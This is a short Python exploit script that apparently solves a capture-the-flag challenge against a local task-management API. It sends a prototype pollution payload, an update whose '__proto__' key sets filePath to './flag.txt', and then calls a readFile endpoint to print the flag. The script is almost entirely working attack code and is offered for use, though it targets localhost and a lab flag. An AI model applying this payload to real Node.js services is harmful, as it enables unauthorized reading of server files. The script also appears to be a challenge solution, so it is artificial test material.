import requests
import json

url_add_task = 'http://localhost:3000/addTask'
url_update_task = 'http://localhost:3000/updateTask'
url_read_file = 'http://localhost:3000/readFile'

payload_add = {
    "id": "test",
    "description": "test"
}

headers = {'Content-Type': 'application/json'}
response = requests.post(url_add_task, headers=headers, data=json.dumps(payload_add))

if response.status_code == 200 and response.json().get('status') == 'success':
    print('Task added successfully.')
else:
    print('Failed to add task.')
    print('Status code:', response.status_code)
    print('Response:', response.text)
    exit()

payload_update = {
    "id": "test",
    "updates": {
        "__proto__": {
            "filePath": "./flag.txt"
        }
    }
}

response = requests.post(url_update_task, headers=headers, data=json.dumps(payload_update))

if response.status_code == 200 and response.json().get('status') == 'success':
    print('Prototype pollution payload sent successfully.')
else:
    print('Failed to send prototype pollution payload.')
    print('Status code:', response.status_code)
    print('Response:', response.text)
    exit()

read_payload = {"id": "test"}
response = requests.post(url_read_file, headers=headers, data=json.dumps(read_payload))

if response.status_code == 200:
    print('Flag content:')
    print(response.text)
else:
    print('Failed to read flag file.')
    print('Status code:', response.status_code)
    print('Response:', response.text)
